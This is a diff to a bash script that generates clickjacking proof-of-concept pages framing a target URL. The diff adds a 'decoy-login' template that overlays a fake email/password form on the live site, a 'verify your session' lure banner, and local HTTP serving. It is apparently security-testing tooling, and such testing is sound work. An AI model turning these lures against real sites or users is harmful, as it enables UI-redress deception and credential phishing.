@@ -1,9 +1,11 @@
 #!/usr/bin/env bash
 # click-jackalope.sh
-# Usage: click-jackalope.sh -u <url> [-e] [-s] [-f <filename>] [-h]
+# Usage: click-jackalope.sh -u <url> [-e] [-s] [-t <template>] [-S <port>] [-f <filename>] [-h]
 # -u <url>       : URL to load in the iframe (required)
 # -e             : execute/open the generated html (optional)
 # -s             : add iframe sandboxing to the generated page (optional)
+# -t <template>  : standard | decoy-login | banner-lure
+# -S <port>      : serve the generated html over HTTP on localhost:<port> (optional)
 # -f <filename>  : output filename (default: clickjack_test.html)
 # -h             : help
 
@@ -12,22 +14,39 @@ set -euo pipefail
 FILE="clickjack_test.html"
 OPEN=false
 SANDBOX=false
+SERVE=false
+SERVE_PORT="9011"
+TEMPLATE="standard"
 URL=""
+SERVER_PID=""
+TMPDIR_PATH=""
 
 print_help() {
-  cat <<EOF
+  cat <<EOF2
 click-jackalope.sh - quick clickjacking proof-of-concept page generator
 
 Usage:
-  ./click-jackalope.sh -u "https://target.example" [-e] [-s] [-f out.html]
+  ./click-jackalope.sh -u "https://target.example" [-e] [-s] [-t template] [-S port] [-f out.html]
 
 Options:
   -u URL        Target URL to embed in iframe (required)
   -e            Open the generated HTML with the system default browser
   -s            Add iframe sandboxing to the generated HTML
+  -t TEMPLATE   standard | decoy-login | banner-lure
+  -S PORT       Serve the generated HTML over HTTP on localhost:PORT
   -f FILENAME   Output filename (default: clickjack_test.html)
   -h            Show this help
-EOF
+EOF2
+}
+
+cleanup() {
+  if [[ -n "$SERVER_PID" ]]; then
+    kill "$SERVER_PID" >/dev/null 2>&1 || true
+  fi
+
+  if [[ -n "$TMPDIR_PATH" && -d "$TMPDIR_PATH" ]]; then
+    rm -rf "$TMPDIR_PATH"
+  fi
 }
 
 escape_html() {
@@ -40,54 +59,23 @@ escape_html() {
   printf '%s' "$value"
 }
 
-# Parse options
-while getopts ":u:esf:h" opt; do
-  case ${opt} in
-    u ) URL="$OPTARG" ;;
-    e ) OPEN=true ;;
-    s ) SANDBOX=true ;;
-    f ) FILE="$OPTARG" ;;
-    h )
-      print_help
-      exit 0
-      ;;
-    \? )
-      echo "Invalid option: -$OPTARG" >&2
-      print_help
-      exit 2
-      ;;
-    : )
-      echo "Option -$OPTARG requires an argument." >&2
-      print_help
-      exit 2
-      ;;
-  esac
-done
+open_target() {
+  local target="$1"
+  if command -v xdg-open >/dev/null 2>&1; then
+    xdg-open "$target" >/dev/null 2>&1 || echo "Failed to open $target with xdg-open"
+  elif command -v open >/dev/null 2>&1; then
+    open "$target" >/dev/null 2>&1 || echo "Failed to open $target with open"
+  elif command -v start >/dev/null 2>&1; then
+    cmd.exe /c start "" "$target" >/dev/null 2>&1 || echo "Failed to open $target with start"
+  else
+    echo "No known method found to open $target automatically."
+  fi
+}
 
-# Validate
-if [[ -z "$URL" ]]; then
-  echo "ERROR: target URL is required (-u)." >&2
-  print_help
-  exit 2
-fi
-
-# Basic normalization/check (not exhaustive)
-if [[ ! "$URL" =~ ^https?:// ]]; then
-  echo "WARNING: URL does not start with http:// or https://. Prepending https://"
-  URL="https://$URL"
-fi
-
-ESCAPED_URL="$(escape_html "$URL")"
-SANDBOX_ATTR=""
-SANDBOX_NOTE="Iframe sandboxing is disabled to better match a real clickjacking attempt."
-
-if $SANDBOX; then
-  SANDBOX_ATTR=' sandbox=""'
-  SANDBOX_NOTE="Iframe sandboxing is enabled for this test."
-fi
-
-# Create HTML safely
-cat > "$FILE" <<HTML
+render_html() {
+  case "$TEMPLATE" in
+    standard)
+      cat <<HTML
 <!doctype html>
 <html lang="en">
 <head>
@@ -111,21 +99,159 @@ cat > "$FILE" <<HTML
 </body>
 </html>
 HTML
+      ;;
+    decoy-login)
+      cat <<HTML
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Clickjacking test: iframe of $ESCAPED_URL</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { margin: 0; min-height: 100vh; font-family: sans-serif; background: radial-gradient(circle at top, #14324a 0%, #09111a 65%); color: #ecf4f8; overflow: hidden; }
+    .frame-wrap { position: fixed; inset: 0; }
+    iframe { width: 100%; height: 100%; border: 0; }
+    .overlay { position: relative; z-index: 2; max-width: 380px; margin: 11vh auto 0; background: rgba(250, 252, 253, 0.95); color: #13212d; border-radius: 16px; padding: 22px; box-shadow: 0 24px 60px rgba(0,0,0,0.35); }
+    h1 { margin: 0 0 6px; font-size: 24px; }
+    p { margin: 0 0 14px; color: #41576a; }
+    label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 6px; }
+    input { width: 100%; margin-bottom: 12px; padding: 11px 12px; border-radius: 10px; border: 1px solid #c7d3dd; }
+    button { width: 100%; border: 0; border-radius: 10px; padding: 12px; background: #0b6bcb; color: white; font-weight: 700; }
+    .foot { margin-top: 12px; font-size: 12px; color: #5c7081; }
+  </style>
+</head>
+<body>
+  <div class="frame-wrap">
+    <iframe src="${ESCAPED_URL}" title="click-jackalope-test"${SANDBOX_ATTR}></iframe>
+  </div>
+  <div class="overlay">
+    <h1>Continue Session</h1>
+    <p>Use this template to demonstrate deceptive overlay positioning over a live framed page.</p>
+    <label>Email</label>
+    <input type="email" placeholder="user@example.test" />
+    <label>Password</label>
+    <input type="password" placeholder="password" />
+    <button type="button">Sign in</button>
+    <div class="foot">Embedded target: ${ESCAPED_URL}<br />${SANDBOX_NOTE}</div>
+  </div>
+</body>
+</html>
+HTML
+      ;;
+    banner-lure)
+      cat <<HTML
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Clickjacking test: iframe of $ESCAPED_URL</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { margin: 0; min-height: 100vh; font-family: sans-serif; background: #f6f7eb; color: #14222e; }
+    .topbar { position: sticky; top: 0; z-index: 3; padding: 14px 18px; background: #8a1538; color: #fff7e6; font-weight: 700; box-shadow: 0 8px 18px rgba(0,0,0,0.16); }
+    .topbar span { display: block; font-size: 12px; font-weight: 400; opacity: 0.9; }
+    main { padding: 18px; }
+    .card { max-width: 960px; margin: 0 auto; background: white; border-radius: 18px; padding: 16px; box-shadow: 0 18px 40px rgba(0,0,0,0.12); }
+    iframe { width: 100%; height: 82vh; border: 0; border-radius: 12px; }
+    .foot { margin-top: 10px; font-size: 12px; color: #5c6770; }
+  </style>
+</head>
+<body>
+  <div class="topbar">Action required: verify your session to continue<span>This template keeps a persistent lure banner above the embedded target.</span></div>
+  <main>
+    <div class="card">
+      <iframe src="${ESCAPED_URL}" title="click-jackalope-test"${SANDBOX_ATTR}></iframe>
+      <div class="foot">Embedded target: ${ESCAPED_URL}<br />${SANDBOX_NOTE}</div>
+    </div>
+  </main>
+</body>
+</html>
+HTML
+      ;;
+    *)
+      echo "ERROR: unknown template '$TEMPLATE'. Use standard, decoy-login, or banner-lure." >&2
+      exit 2
+      ;;
+  esac
+}
 
-echo "Wrote $FILE (target: $URL, sandbox: $SANDBOX)"
+trap cleanup EXIT
+
+while getopts ":u:est:S:f:h" opt; do
+  case ${opt} in
+    u ) URL="$OPTARG" ;;
+    e ) OPEN=true ;;
+    s ) SANDBOX=true ;;
+    t ) TEMPLATE="$OPTARG" ;;
+    S ) SERVE=true; SERVE_PORT="$OPTARG" ;;
+    f ) FILE="$OPTARG" ;;
+    h )
+      print_help
+      exit 0
+      ;;
+    \? )
+      echo "Invalid option: -$OPTARG" >&2
+      print_help
+      exit 2
+      ;;
+    : )
+      echo "Option -$OPTARG requires an argument." >&2
+      print_help
+      exit 2
+      ;;
+  esac
+done
+
+if [[ -z "$URL" ]]; then
+  echo "ERROR: target URL is required (-u)." >&2
+  print_help
+  exit 2
+fi
+
+if [[ ! "$URL" =~ ^https?:// ]]; then
+  echo "WARNING: URL does not start with http:// or https://. Prepending https://"
+  URL="https://$URL"
+fi
+
+if $SERVE; then
+  if [[ ! "$SERVE_PORT" =~ ^[0-9]+$ ]] || (( SERVE_PORT < 1 || SERVE_PORT > 65535 )); then
+    echo "ERROR: -S requires a valid port between 1 and 65535." >&2
+    exit 2
+  fi
+fi
+
+ESCAPED_URL="$(escape_html "$URL")"
+SANDBOX_ATTR=""
+SANDBOX_NOTE="Iframe sandboxing is disabled to better match a real clickjacking attempt."
+
+if $SANDBOX; then
+  SANDBOX_ATTR=' sandbox=""'
+  SANDBOX_NOTE="Iframe sandboxing is enabled for this test."
+fi
+
+render_html > "$FILE"
+
+echo "Wrote $FILE (target: $URL, sandbox: $SANDBOX, template: $TEMPLATE)"
+
+if $SERVE; then
+  TMPDIR_PATH="$(mktemp -d)"
+  cp "$FILE" "$TMPDIR_PATH/index.html"
+  echo "Serving PoC at http://127.0.0.1:${SERVE_PORT}/"
+  python3 -m http.server "$SERVE_PORT" --bind 127.0.0.1 --directory "$TMPDIR_PATH" >/dev/null 2>&1 &
+  SERVER_PID=$!
+
+  if $OPEN; then
+    open_target "http://127.0.0.1:${SERVE_PORT}/"
+  fi
+
+  echo "Press Ctrl+C to stop serving."
+  wait "$SERVER_PID"
+  exit 0
+fi
 
 if $OPEN; then
-  # Cross-platform open
-  if command -v xdg-open >/dev/null 2>&1; then
-    xdg-open "$FILE" >/dev/null 2>&1 || echo "Failed to open $FILE with xdg-open"
-  elif command -v open >/dev/null 2>&1; then
-    open "$FILE" >/dev/null 2>&1 || echo "Failed to open $FILE with open"
-  elif command -v start >/dev/null 2>&1; then
-    # 'start' is typically a Windows cmd builtin; in Git Bash you can use 'cmd.exe /c start'
-    cmd.exe /c start "" "$(cygpath -w "$PWD/$FILE")" >/dev/null 2>&1 || echo "Failed to open $FILE with start"
-  else
-    echo "No known method found to open the file automatically. Please open $FILE manually."
-  fi
+  open_target "$FILE"
 fi
 
 exit 0
